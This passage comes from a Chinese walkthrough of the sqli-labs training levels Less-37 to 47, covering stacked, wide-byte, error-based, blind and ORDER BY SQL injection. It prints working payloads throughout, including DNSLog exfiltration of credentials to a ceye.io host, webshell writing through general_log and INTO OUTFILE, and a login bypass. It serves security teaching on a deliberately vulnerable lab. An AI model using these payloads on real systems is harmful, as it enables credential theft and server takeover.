--+</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=</span><br></pre></td></tr></table></figure><h2 id="堆叠注入-38-53-关"><a href="#堆叠注入-38-53-关" class="headerlink" title="堆叠注入 38-53 关"></a>堆叠注入 38-53 关</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>MySQL 的命令行中，每一条语句以<code>;</code>结尾，这代表语句的结束，如果在注入过程中在<code>;</code>后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id = 1;select version();</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.5.44-0ubuntu0.14.04.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h3><p><strong>MySQL</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="keyword">version</span>();</span><br></pre></td></tr></table></figure><p><strong>SQL Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;select * from test;</span><br></pre></td></tr></table></figure><p><strong>Postgresql</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_test;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>注入天书里面说 Oracle 不支持堆叠查询，这个国光我对 Oracle 不熟悉，以后接触到了国光再亲自尝试看看。</p><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>又到了简单源码分析的时间了，来看看堆叠注入的代码是如何实现的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 参数直接带入到 SQL 语句中</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error($con1));</span><br></pre></td></tr></table></figure><p>发现和之前的关卡区别不大，唯一的区别就是查询 SQL 语句由原来的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>变成了现在的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure><p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p><p>既然知道原理了 那么这一关就详细演示一下这个堆叠注入如何灵活使用：</p><p><strong>添加字段值</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;insert into users(username,password) values (&apos;hello&apos;,&apos;world&apos;);</span><br></pre></td></tr></table></figure><p>数据库中查看是否添加成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username = <span class="string">'hello'</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| 23 | hello    | world    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>但是这个貌似并没有什么作用，但是注入天书里面也没有说其他的姿势，实际上看到这里的人应该明白后面是可以执行任意 SQL 语句的，那么这个怎么进行漏洞利用的话 就完全看你的想象力了，接下来国光演示我认为比较实用的姿势。</p><h4 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h4><p>需要条件：</p><ol><li>MySQL 开启 load_file()</li><li>DNSLog 平台 （<a href="http://hyuga.co/" target="_blank" rel="noopener">Hyuga</a>、<a href="http://ceye.io/" target="_blank" rel="noopener">CEYE</a>）</li><li>Windows 平台</li></ol><p>load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\192.168.31.53\test\</span><br></pre></td></tr></table></figure><p><code>CONCAT()</code> 函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用 UNC 路径。</p><p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p><p>下面国光临时使用 Windows 下的 PHPStudy 来搭建 sqli-labs 测试环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;select load_file(concat(&apos;\\\\&apos;,(select hex(concat_ws(&apos;~&apos;,username,password)) from users limit 0,1),&apos;.gvc791.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="http://qiniuyun.lintstar.top/15897015756622.png" alt="15897015756622"><br>手动 Hex 解码即可</p><h4 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h4><p>需要条件：</p><ol><li>Web 的物理路径</li><li>MySQL 可以读写 Web 目录</li><li>Windows 成功率 高于 Linux</li></ol><p>首先查看当前的日志的相关配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/bb198f1a9cc6.log |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure><p>Docker 里面的这个 Ubuntu 环境默认是没有开启的，这里尝试注入的时候手动开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;;set global general_log = &quot;ON&quot;;set global general_log_file=&apos;/var/www/html/shell.php&apos;;--+</span><br></pre></td></tr></table></figure><p>然后 MySQL 再查看日志配置是否被修改了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'general%'</span>;</span><br><span class="line">+------------------+-------------------------+</span><br><span class="line">| Variable_name    | Value                   |</span><br><span class="line">+------------------+-------------------------+</span><br><span class="line">| general_log      | ON                      |</span><br><span class="line">| general_log_file | /var/www/html/shell.php |</span><br><span class="line">+------------------+-------------------------+</span><br></pre></td></tr></table></figure><p>这个尝试 getshell：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1';select &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>日志里面就会记录<code>&lt;?php phpinfo();?&gt;</code>，浏览器访问查看：</p><p>查看一下当的日志文件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/www/html/shell.php</span><br><span class="line">200517  8:47:04       10 Connect    root@localhost on security</span><br><span class="line">           10 Init DB    security</span><br><span class="line">           10 Query    <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span><span class="comment">-- ' LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>此时已经成功写入了，但是因为这个文件属于 mysql 用户组的，国光我测试并没有成功执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l  /var/www/html/shell.php</span><br><span class="line">-rw-rw---- 1 mysql mysql 171 May 17 08:47 /var/www/html/shell.php</span><br></pre></td></tr></table></figure><p>不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，如果有师傅补充的话 欢迎评论区留言！</p><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-38 相比没有啥区别，只是拼接方式不一样。</p><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-38 相比只是拼接方式不一样。</p><p>但是看了这一关源码下面还有其他文件，类似于 Less-24 的二次注入，看了下源码貌似和 Less-24 是一样的，可能是作者的疏忽吧，忘记删掉这些不相干的文件了。</p><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>id=$id</code></td></tr></tbody></table><p>和 Less-39 类似，因为少了报错输出，所以这里不能报错注入，其他注入方式一样，国光这里不再赘述。</p><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><ul><li><code>index.php</code></li></ul><p>没有啥核心代码，PHP 和 HTML 混写，只要写了登录的表单，并提供了忘记密码和创建用户的链接，相比于 Less-24 的二次注入，这两个链接都不能直接访问，无法直接创建用户。</p><ul><li><code>forgot_password.php</code></li></ul><p>if you forgot your password,go to hack it</p><ul><li><code>acc-create.php</code></li></ul><p>if you need to create account,then hack your way in</p><ul><li><code>failed.php</code></li></ul><p>Bug off you silly dump hacker</p><ul><li><code>login.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># username 被过滤 ' " \ password 没有被</span></span><br><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆叠查询</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">mysqli_multi_query($con1, $sql))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登录成功:</span><br><span class="line">    setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br><span class="line">    跳转到 logged-in.php</span><br></pre></td></tr></table></figure><ul><li><code>logged-in.php</code></li></ul><p>登录成功，提供修改密码的表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"mylogin"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"pass_change.php"</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>pass_change.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 没有登录:</span><br><span class="line">    重定向到 index.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 提交了修改密码表单:</span><br><span class="line">    $username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">    $curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">    $pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> $pass==$re_pass:</span><br><span class="line">        $sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure><p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p><p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-42/login.php</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=1' or 1#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p>因为登录成功后返回：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> $row[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>所以登录了 id 为 1 的 Dumb 用户：</p><p><img src="http://qiniuyun.lintstar.top/15897218466276.png" alt="15897218466276"></p><p>尝试<strong>联合查询</strong>:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-42/login.php</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1&apos; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p>同理这里也可以进行盲注和堆叠查注入，国光这里不再赘述。</p><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=&#39;$username&#39;</code></td></tr></tbody></table><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、布尔盲注、延时盲注、堆叠注入</td><td><code>username=(&#39;$username&#39;)</code></td></tr></tbody></table><p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 方式获取 sort 参数</span></span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将 id 带入 SQL 中</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p><h4 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h4><ul><li><strong>升序和降序验证</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 升序排序</span></span><br><span class="line">?sort=1 asc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 降序排序</span></span><br><span class="line">?sort=1 dasc</span><br></pre></td></tr></table></figure><ul><li><strong>rand() 验证</strong></li></ul><p>rand(ture) 和 rand(false) 的结果是不一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(true)</span><br><span class="line">?sort=rand(false)</span><br></pre></td></tr></table></figure><p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p><p>此外 rand() 结果是一直都是随机的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand()</span><br><span class="line">?sort=1 and rand()</span><br></pre></td></tr></table></figure><ul><li><strong>延时验证</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=sleep(1)</span><br><span class="line">?sort=(sleep(1))</span><br><span class="line">?sort=1 and sleep(1)</span><br></pre></td></tr></table></figure><p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p><h4 id="报错注入1-2"><a href="#报错注入1-2" class="headerlink" title="报错注入1"></a>报错注入1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br></pre></td></tr></table></figure><h4 id="报错注入2-2"><a href="#报错注入2-2" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>利用 procedure analyse 参数，也可以执行报错注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br><span class="line">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&apos;:&apos;,username,password)+FROM+users limit 0,1))),1)</span><br></pre></td></tr></table></figure><h4 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>数据库第 1 位为：s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(left(database(),1)&gt;&apos;r&apos;)</span><br><span class="line">?sort=rand(left(database(),1)&gt;&apos;s&apos;)</span><br></pre></td></tr></table></figure><h4 id="延时盲注-2"><a href="#延时盲注-2" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br></pre></td></tr></table></figure><h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><p><strong>将查询结果导入到文件中</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile "/var/www/html/less46.txt"</span><br></pre></td></tr></table></figure><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p><p>访问验证是否有信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:8888/less46.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure><p><strong>利用导出文件 getshell</strong>：</p><p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;/var/www/html/less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p><p>来查看下写入的文件内容是啥样子的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/www/html/less46.php</span><br><span class="line">1    Dumb    Dumb&lt;?php phpinfo();?&gt;2    Angelina    I-kill-you&lt;?php phpinfo();?&gt;3    Dummy    p@ssword&lt;?php phpinfo();?&gt;4    secure    crappy&lt;?php phpinfo();?&gt;5    stupid    stupidity&lt;?php phpinfo();?&gt;6    superman    genious&lt;?php phpinfo();?&gt;7    batman    mob!le&lt;?php phpinfo();?&gt;8    admin    admin&lt;?php phpinfo();?&gt;9    admin1    admin1&lt;?php phpinfo();?&gt;10    admin2    admin2&lt;?php phpinfo();?&gt;11    admin3    admin3&lt;?php phpinfo();?&gt;12    dhakkan    dumbo&lt;?php phpinfo();?&gt;14    admin4    admin4&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>浏览器访问测试看看：</p><p><img src="http://qiniuyun.lintstar.top/15897680165097.png" alt="15897680165097"></p><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-46 